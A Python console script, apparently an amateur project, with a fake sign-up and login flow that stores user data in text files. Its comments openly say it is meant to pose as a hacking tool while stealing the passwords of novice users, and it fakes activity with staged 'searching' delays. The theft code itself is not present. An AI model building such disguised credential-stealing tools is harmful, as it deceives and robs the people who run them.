# -*- coding: utf8 -*-
'''
Hi!
this fuckin' code was writing to steal passwords from under-hackers who dont really understand it.
at the time when i wrote that shit, only i and god knew how it works.
now even god has hammered a fat dick on it, so u can figure it out for yourself, after all,it's a damn python.
Written by Platonov Yaroslav, last update: 17.04.2021 (19:50)
my mail: oter27y53@gmail.com
'''

#imports here
from time import sleep
from random import randint
from colorama import Fore, Back

'''
этот блок отделён от остальных, потому что тут описываются локальные методы.
если где-то я забыл описание, то ты всегда можешь найти файл, из которого метод был импортирован и сам просмотреть его.'''
from methods import run, register
from functions import confirm, passgen, read, checkin, checkfor
from global_procedures import close, mail
#from aps import client, server #на это просто забей :)

import datetime


'''Специально для Александра Евсюкова: 
1. все блоки и функции я закоментировал и объяснил, надеюсь, понятно.
    если что - потом спросишь.
2. если какая-то функция осталась без описания, просмотри её в в файле, из которого она была импортирована.
3. все методы, импортированные из локальных файлов, кроме метода отправки сообщения на почту, придумал я. 
    если что, можешь пользоваться.'''

print(Back.BLACK)
run() #делаем вид, типо прога чё-то реально делает

#это регистрация. я её реализовал по-тупому, но больше смогу сделать, когда заменю это всё на онлайн базу данных
print('[' + datetime.datetime.now().strftime('%d.%m.%Y %H:%M%S') + ']', 'sy$tem: want to coninue?(y/n)\n', Fore.BLUE)
temp = checkin(['y', 'n']) #смотри в functions.py. я придумал неплохую функцию, которая будет повторно выполнять определённый блок команд, пока не получит на вход те значения, которые я передал в списке в качестве аргумента.
if temp == 'y':
    if confirm(): #отдельный алгоритм подтверждения доступа, его подробно опишу в functions.py
        print(Fore.GREEN + '{ WELCMOME :) }\n')
        print('''
        {CHOOSE ACTION:}

        1>sign_up()
        2>log_in()''' + Fore.BLUE)
        reg = checkin(['1', '2']) #та же самая функция
        if reg == '1':
            register() #алгоритм регистрации. описан в methods.py. по сути, всё, что мы делаем - записываем ввод пользователя в файл.
        elif reg == '2':
            print(Fore.GREEN + '[' + datetime.datetime.now().strftime('%d.%m.%Y %H:%M%S') + ']', 'sy$stem: enter your id' + Fore.BLUE)
            tid = input('you: ') #если же пользователь входит, а не регистрируется просим его ввести свой id, потомучто все id пользователей - названия файлов с их данными, лучше пока не придумал.
            print(Fore.GREEN + '[SEARCHING]') #делаем вид, что ищем пользователя, для этого и задежка
            sleep(1)
            print('[...]')
            sleep(randint(1, 6))


            client = 'users/' + tid + '.txt' #формируем название файла на основе id пользователя. если не понятно - напишешь.
            try:
                profile = open(client, 'r') #открываем файл (функция open имеет несколько режимов работы, которые передаются в качестве строки, как второй аргумент. "r" - режим чтения. если файла нет - будет ошибка. поэтому try)
            except:
                print('[ID NOT FOUND]\n' + '[' + datetime.datetime.now().strftime('%d.%m.%Y %H:%M%S') + ']', 'sy$stem: want to register?(y/n)' + Fore.BLUE) #если файл не найден, значит указанного id нет. предлагаем зарегестрироваться.
                want = checkin(['y', 'n'])
                if want == 'y':
                    register()
                elif want == 'n':
                    close(None) #процедура, которая закрывает программу. в качестве аргумента принимает строку(желательно строку, потому что проверку типа переменной я не реализовывал, ибо она еще принимает None), которую выведет при закрытии. если передаёться None - выполняет выход по стандарту.
                else:
                    pass

            print(Fore.GREEN + '[ID FOUND]\n', '[' + datetime.datetime.now().strftime('%d.%m.%Y %H:%M%S') + ']', 'sy$tem: enter your password' + Fore.BLUE)
            nov = checkfor(read(client, 9), client) #это максимально криво, но исправлять мне пока лень. просто объяснить, как она работает я не могу, потому что и сам понятия не имею. вообще, она проверяет пароль для входа, ну да ладно. посмотри fynctions.py, там я хотя-бы объясню, что я пытался написать. функцию read смотри в functions.py
            nov.append(tid) #nov - список, который содержит данные о пользователе, в качестве собственных элементов: 1 - подтверждён ли вход(хз зачем, он по-любому будет подтверждён, в другой ситуации, этот блок просто не выполнится), 2 - ник пользователя(именно ник), 3 - id пользователя. (пока без понятия зачем, но не буду же я каждый раз вытаскивать это из файла, если понадобиться.)
            if nov[0]: #наконец-то, осле горы всего тог говна, что ты повидал выше, ты добрался до клиента. именно здесь должна быть та часть программы, которая должна якобы что-то делать, но на самом деле, она будет крать пароли.пока что я еще ничего не придумал.была идея с чатом, но там столько ошибок, что мне лучше заново что-то придумать, чем исправить их.
                '''print(Fore.GREEN + '{ YOU ARE WELCOME! :) }\n\n' + '1>start_chat()\n2>my_profile()')
                col = checkin(['1', '2'])
                if col == '1':
                    print('\n\n1>run_server()\n2>run_client()')
                    rel = checkin(['1', '2'])
                    if rel == '1':
                        server()
                    elif rel == '2':
                        client()
                    else:
                        pass
                else:
                    pass'''
#поскольку checkin никогда не вернёт false, эти блоки выполняться не будут, их можно было бы убрать, но я хочу сделать тут пасхалочку. еще пока не сообразил, всё воображение ушло на описания проекта.
            else:
                pass
        else:
            pass

    else:
        pass

elif temp == 'n':
    close(None)
else:
    pass